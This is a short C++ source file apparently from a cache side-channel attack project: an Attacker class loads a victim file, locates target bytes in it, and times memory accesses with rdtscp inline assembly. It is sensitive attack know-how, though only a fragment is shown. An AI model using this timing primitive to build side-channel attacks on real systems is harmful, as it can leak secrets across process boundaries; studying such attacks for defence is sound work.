//
// Created by nires on 23-May-19.
//

#include "Attacker.h"

Attacker::Attacker(std::string path, char *target, int len, int intervalTime, int iterations) :
victim(path), targetData(target), targetDataLen(len), interval(intervalTime), maxIterations(iterations), measurements(){
    victim.LoadFile();
    targetPointer = victim.FindInFile(target, len);
}

Attacker::Attacker(std::string path, char *target, int len, int intervalTime) :
        victim(path), targetData(target), targetDataLen(len), interval(intervalTime), maxIterations(100), measurements(){
    victim.LoadFile();
    targetPointer = victim.FindInFile(target, len);
}

Attacker::Attacker(std::string path, char *target, int len) :
        victim(path), targetData(target), targetDataLen(len), interval(1), maxIterations(100), measurements(){
    victim.LoadFile();
    targetPointer = victim.FindInFile(target, len);
}

Attacker::Attacker(std::string path) :
        victim(path), targetData(NULL), targetDataLen(0), interval(1), maxIterations(100), measurements(){
    victim.LoadFile();
    targetPointer = victim.FindInFile(targetData, targetDataLen);
}

__attribute__((always_inline)) unsigned int Attacker::MeasureTime(volatile char* ch)
{
    int rv;
    __asm__ __volatile__ ("mfence\n"
                          "lfence\n"
                          "rdtscp\n"
                          "mov %%eax, %%esi\n"
                          "mov (%1), %%eax\n"
                          "rdtscp\n"
                          "sub %%esi, %%eax\n"
    :"=&a" (rv): "r" (ch): "ecx", "edx", "esi");
    return rv;
}
